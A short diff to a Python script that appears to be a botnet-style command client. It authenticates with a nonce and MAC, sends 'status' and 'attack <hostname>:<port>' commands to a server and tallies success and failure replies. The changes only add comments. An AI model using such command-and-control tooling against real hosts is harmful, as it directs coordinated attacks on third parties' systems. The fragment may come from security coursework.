@@ -40,7 +40,7 @@ def collect_responses(sock, timeout=5):
                 if not data:
                     # Connection closed
                     break
-                buffer_data += data.decode('utf-8', errors='ignore')
+                buffer_data += data.decode('utf-8', errors='ignore') # Append the decoded string from byte data to buffer_data, 
                 # Split on newlines
                 while "\n" in buffer_data:
                     line, buffer_data = buffer_data.split("\n", 1)
@@ -164,7 +164,8 @@ def main():
             sys.exit(0)
 
         elif command == "status":
-            nonce = generate_nonce()
+            #authentication
+            nonce = generate_nonce() 
             mac = compute_mac(nonce, secret)
             msg = f"{nonce} {mac} status\n"
             s.sendall(msg.encode('utf-8'))
@@ -200,12 +201,13 @@ def main():
                 print("Error: attack requires <hostname>:<port>")
                 continue
             target = parts[1]
+            #auth
             nonce = generate_nonce()
             mac = compute_mac(nonce, secret)
             msg = f"{nonce} {mac} attack {target}\n"
-            s.sendall(msg.encode('utf-8'))
+            s.sendall(msg.encode('utf-8')) # Send the attack message over the socket
             lines = collect_responses(s, timeout=5)
-            succ, fail = parse_attack_responses(lines)
+            succ, fail = parse_attack_responses(lines) #parse for success and failure
             total_ok = len(succ)
             total_fail = len(fail)
             print(f"  Waiting 5s to gather replies.")
